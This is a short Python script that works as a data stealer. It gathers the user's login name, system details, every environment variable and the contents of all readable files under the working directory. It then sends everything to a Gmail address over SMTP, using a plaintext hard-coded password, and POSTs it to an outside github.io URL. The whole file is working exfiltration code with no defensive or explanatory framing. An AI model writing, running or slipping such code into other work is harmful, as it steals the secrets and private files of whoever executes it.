import os
import requests
import json
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configuration
TARGET_URL = "https://DarkosDominar.github.io/CIA-Language-/"
EMAIL = "darkosdominar@gmail.com"
PASSWORD = "darkosdominar222121111"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Function to send email
def send_email(subject, body):
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        msg = MIMEMultipart()
        msg['From'] = EMAIL
        msg['To'] = EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        server.sendmail(EMAIL, EMAIL, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to collect data
def collect_data():
    data = {
        "username": os.getlogin(),
        "system_info": os.uname(),
        "environment_vars": dict(os.environ),
        "files": []
    }
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                data["files"].append({"filename": file, "content": content})
            except Exception as e:
                print(f"Error reading file {file_path}: {e}")
    return data

# Main function
def main():
    try:
        data = collect_data()
        send_email("Collected Data", json.dumps(data, indent=4))
        response = requests.post(TARGET_URL, json=data)
        if response.status_code == 200:
            print("Data sent successfully to the target URL.")
        else:
            print(f"Failed to send data to the target URL. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()